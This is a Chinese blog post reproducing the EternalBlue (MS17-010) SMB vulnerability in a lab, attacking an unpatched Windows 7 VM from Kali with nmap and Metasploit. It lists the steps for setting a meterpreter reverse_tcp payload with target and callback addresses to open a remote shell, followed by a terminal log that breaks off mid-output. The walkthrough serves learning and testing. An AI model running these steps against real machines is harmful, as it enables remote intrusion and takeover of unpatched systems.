<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Windows MS17-010漏洞复现（永恒之蓝）简单复现 | Cyberangel-blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="漏洞简介永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对 SMB 服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。Eternalblue 通过 TCP 端口 445 和 139 来利用 SMBv1 和 NBT 中的远程代码执行漏洞，恶意代码会扫描开放 445 文件共享端口的 Windows 机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows MS17-010漏洞复现（永恒之蓝）简单复现">
<meta property="og:url" content="https://cyberangel.cn/2020/07/22/Windows%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Cyberangel-blog">
<meta property="og:description" content="漏洞简介永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对 SMB 服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。Eternalblue 通过 TCP 端口 445 和 139 来利用 SMBv1 和 NBT 中的远程代码执行漏洞，恶意代码会扫描开放 445 文件共享端口的 Windows 机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2020-07-22T10:44:50.000Z">
<meta property="article:modified_time" content="2021-07-04T09:57:18.736Z">
<meta property="article:author" content="Cyberangel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://cyberangel.cn/2020/07/22/Windows%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%EF%BC%89%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Windows MS17-010漏洞复现（永恒之蓝）简单复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-04 17:57:18'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Cyberangel-blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">317</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Cyberangel-blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Windows MS17-010漏洞复现（永恒之蓝）简单复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-22T10:44:50.000Z" title="发表于 2020-07-22 18:44:50">2020-07-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:18.736Z" title="更新于 2021-07-04 17:57:18">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Windows MS17-010漏洞复现（永恒之蓝）简单复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对 SMB 服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。<br>Eternalblue 通过 TCP 端口 445 和 139 来利用 SMBv1 和 NBT 中的远程代码执行漏洞，恶意代码会扫描开放 445 文件共享端口的 Windows 机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h1><p>目前已知受影响的 Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
<h1 id="复现工具"><a href="#复现工具" class="headerlink" title="复现工具"></a>复现工具</h1><p>靶机：Windows 7 x64（未开启防火墙，开启 445 端口，未安装杀毒软件）<br>攻击端：VMware 虚拟机：kali-linux-2020.2a-vmware-amd64</p>
<h1 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h1><blockquote>
<p>我的 Windows 7 是全新安装的，未安装任何补丁</p>
</blockquote>
<p>首先启动 Windows 7 虚拟机：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595415407258-658d14f8-2b10-4e1d-a62b-6b06a0f76f2c.png#align=left&display=inline&height=842&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722185637.png&originHeight=842&originWidth=1920&size=186132&status=done&style=none&width=1920" alt="TIM截图20200722185637.png"><br>关闭防火墙：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595415447007-a2405075-75f8-473b-8609-ea99ccd09b2a.png#align=left&display=inline&height=838&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722185714.png&originHeight=838&originWidth=1920&size=164640&status=done&style=none&width=1920" alt="TIM截图20200722185714.png"><br>查看靶机的 IP 地址（cmd-&gt;ipconfig）<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595415514196-facb3bab-43c7-4d0a-9aab-1ddede236dfa.png#align=left&display=inline&height=548&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722185827.png&originHeight=548&originWidth=841&size=49306&status=done&style=none&width=841" alt="TIM截图20200722185827.png"><br>记下此 IP 地址：192.168.11.131<br>启动 kali 虚拟机，先试探能否连接靶机：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595415727681-e1578ffc-61d0-44ea-8433-a9e51044655e.png#align=left&display=inline&height=151&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722190200.png&originHeight=151&originWidth=514&size=34837&status=done&style=none&width=514" alt="TIM截图20200722190200.png"><br>以管理员身份运行 nmap，查找靶机所开启的端口，如下图所示<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595415691865-ef6ebf35-f725-4658-b7e2-711955d9a616.png#align=left&display=inline&height=443&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722190122.png&originHeight=443&originWidth=528&size=104062&status=done&style=none&width=528" alt="TIM截图20200722190122.png"><br>从上图可以看到，靶机的 445 端口已开启，有可能触发漏洞<br>进入渗透神器：msfconsole<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595415911283-8995988b-36c7-46ba-90f7-08e90a98efcc.png#align=left&display=inline&height=452&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722190501.png&originHeight=452&originWidth=566&size=49773&status=done&style=none&width=566" alt="TIM截图20200722190501.png"><br>输入“search MS17-010”以查找此漏洞<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595416086376-2476c8fa-abab-4aed-8bc4-35e41f88245e.png#align=left&display=inline&height=267&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722190733.png&originHeight=267&originWidth=1444&size=81943&status=done&style=none&width=1444" alt="TIM截图20200722190733.png"><br>如上图所示：可以看到有 auxiliary（辅助）模块和 exploit（攻击）模块<br>可以先使用辅助扫描模块进行测试，如下图：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595416256577-9a7c7742-dea3-4fa1-9b09-72c6727d2892.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722191050.png&originHeight=158&originWidth=980&size=50955&status=done&style=none&width=980" alt="TIM截图20200722191050.png"><br>可以看到，靶机容易遭受到 MS17-010 漏洞的攻击，接下来使用攻击模块进行攻击：</p>
<blockquote>
<p>选择攻击模块时注意选择合适的版本，有些版本使用于 win8 以上</p>
</blockquote>
<p>设置流程如下：<br>set payload ：设置 payload，这里用 set payload windows/x64/meterpreter/reverse_tcp</p>
<blockquote>
<p>要选用其他 payload 可以使用 show payloads 查看适合要攻击的目标主机的 payload</p>
</blockquote>
<p>show options ：使用该命令会列出使用当前模块所需呀配置的参数<br>set RHOSTS（rhosts） 目标主机地址 ：该命令会设置好要攻击的目标主机地址<br>set LHOST（lhost） 攻击机地址 ：该命令设置攻击机的地址，使目标主机回连至攻击机<br>set LPORT（lport） 回连的端口 ：该命令设置目标主机回连至攻击机的端口，默认为 4444<br>run、exploit：开始攻击<br>这里攻击端的 IP 地址为：192.168.11.150<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595416589945-d05b181c-a891-4608-8649-86426a064fad.png#align=left&display=inline&height=237&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722191613.png&originHeight=237&originWidth=838&size=92751&status=done&style=none&width=838" alt="TIM截图20200722191613.png"><br>攻击端设置如下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595416803556-93d6d715-5867-4888-8105-3649a0f6af1c.png#align=left&display=inline&height=628&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722191948.png&originHeight=628&originWidth=1042&size=174910&status=done&style=none&width=1042" alt="TIM截图20200722191948.png"><br>输入 run 以进行攻击：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1595416847854-81c7b9b0-fa6e-4887-a7cc-5c6f350a280d.png#align=left&display=inline&height=518&margin=%5Bobject%20Object%5D&name=TIM%E6%88%AA%E5%9B%BE20200722192040.png&originHeight=518&originWidth=982&size=201968&status=done&style=none&width=982" alt="TIM截图20200722192040.png"><br>出现 WIN 就说明攻击成功，详细的日志信息如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">ali@kali:~/Desktop<span class="variable">$</span> nmap <span class="literal">-sS</span> <span class="number">192.168</span>.<span class="number">11.131</span></span><br><span class="line">You requested a scan <span class="built_in">type</span> which requires root privileges.</span><br><span class="line">QUITTING!</span><br><span class="line">kali@kali:~/Desktop<span class="variable">$</span> sudo nmap <span class="literal">-sS</span> <span class="number">192.168</span>.<span class="number">11.131</span></span><br><span class="line">[<span class="type">sudo</span>] kali 的密码：</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https://nmap.org ) at <span class="number">2020</span><span class="literal">-07</span><span class="literal">-22</span> <span class="number">07</span>:<span class="number">01</span> EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">11.131</span></span><br><span class="line">Host is up (<span class="number">0.00043</span>s latency).</span><br><span class="line">Not shown: <span class="number">987</span> closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft<span class="literal">-ds</span></span><br><span class="line"><span class="number">554</span>/tcp   open  rtsp</span><br><span class="line"><span class="number">2869</span>/tcp  open  icslap</span><br><span class="line"><span class="number">5357</span>/tcp  open  wsdapi</span><br><span class="line"><span class="number">10243</span>/tcp open  unknown</span><br><span class="line"><span class="number">49152</span>/tcp open  unknown</span><br><span class="line"><span class="number">49153</span>/tcp open  unknown</span><br><span class="line"><span class="number">49154</span>/tcp open  unknown</span><br><span class="line"><span class="number">49155</span>/tcp open  unknown</span><br><span class="line"><span class="number">49156</span>/tcp open  unknown</span><br><span class="line"><span class="number">49157</span>/tcp open  unknown</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">45</span>:<span class="number">1</span>C:<span class="number">98</span> (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">3.90</span> seconds</span><br><span class="line">kali@kali:~/Desktop<span class="variable">$</span> ping <span class="number">192.168</span>.<span class="number">11.131</span></span><br><span class="line">PING <span class="number">192.168</span>.<span class="number">11.131</span> (<span class="number">192.168</span>.<span class="number">11.131</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of <span class="keyword">data</span>.</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">192.168</span>.<span class="number">11.131</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">0.493</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">192.168</span>.<span class="number">11.131</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">128</span> time=<span class="number">0.961</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">192.168</span>.<span class="number">11.131</span>: icmp_seq=<span class="number">3</span> ttl=<span class="number">128</span> time=<span class="number">1.25</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">192.168</span>.<span class="number">11.131</span>: icmp_seq=<span class="number">4</span> ttl=<span class="number">128</span> time=<span class="number">1.08</span> ms</span><br><span class="line">^Z</span><br><span class="line">[<span class="number">1</span>]+  已停止               ping <span class="number">192.168</span>.<span class="number">11.131</span></span><br><span class="line">kali@kali:~/Desktop<span class="variable">$</span> msfconsole</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                 _---------.</span><br><span class="line">             .<span class="string">&#x27; #######   ;.&quot;</span></span><br><span class="line"><span class="string">  .---,.    ;@             @@`;   .---,..</span></span><br><span class="line"><span class="string">.&quot; @@@@@&#x27;</span>.,<span class="string">&#x27;@@            @@@@@&#x27;</span>,.<span class="string">&#x27;@@@@ &quot;.</span></span><br><span class="line"><span class="string">&#x27;</span>-.<span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span>          <span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span> <span class="selector-tag">@</span>;</span><br><span class="line">   `.<span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span>        <span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span> .<span class="string">&#x27;</span></span><br><span class="line"><span class="string">     &quot;--&#x27;</span>.<span class="selector-tag">@</span><span class="selector-tag">@</span><span class="selector-tag">@</span>  -.<span class="selector-tag">@</span>        <span class="selector-tag">@</span> ,<span class="string">&#x27;-   .&#x27;</span>--<span class="string">&quot;</span></span><br><span class="line"><span class="string">          &quot;</span>.<span class="string">@&#x27; ; @       @ `.  ;&#x27;</span></span><br><span class="line"><span class="string">            |@@@@ @@@     @    .</span></span><br><span class="line"><span class="string">             &#x27; @@@ @@   @@    ,</span></span><br><span class="line"><span class="string">              `.@@@@    @@   .</span></span><br><span class="line"><span class="string">                &#x27;,@@     @   ;           _____________</span></span><br><span class="line"><span class="string">                 (   3 C    )     /|___ / Metasploit! \</span></span><br><span class="line"><span class="string">                 ;@&#x27;. __*__,.&quot;    \|--- \_____________/</span></span><br><span class="line"><span class="string">                  &#x27;(.,....&quot;/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v5.0.87-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 2006 exploits - 1096 auxiliary - 343 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Metasploit tip: Use the resource command to run commands from a file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 &gt; search MS17-010</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Matching Modules</span></span><br><span class="line"><span class="string">================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   #  Name                                           Disclosure Date  Rank     Check  Description</span></span><br><span class="line"><span class="string">   -  ----                                           ---------------  ----     -----  -----------</span></span><br><span class="line"><span class="string">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span></span><br><span class="line"><span class="string">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection</span></span><br><span class="line"><span class="string">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span></span><br><span class="line"><span class="string">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+</span></span><br><span class="line"><span class="string">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span></span><br><span class="line"><span class="string">   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module options (auxiliary/scanner/smb/smb_ms17_010):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name         Current Setting                                                 Required  Description</span></span><br><span class="line"><span class="string">   ----         ---------------                                                 --------  -----------</span></span><br><span class="line"><span class="string">   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts</span></span><br><span class="line"><span class="string">   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts</span></span><br><span class="line"><span class="string">   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts</span></span><br><span class="line"><span class="string">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check</span></span><br><span class="line"><span class="string">   RHOSTS       192.168.11.131                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line"><span 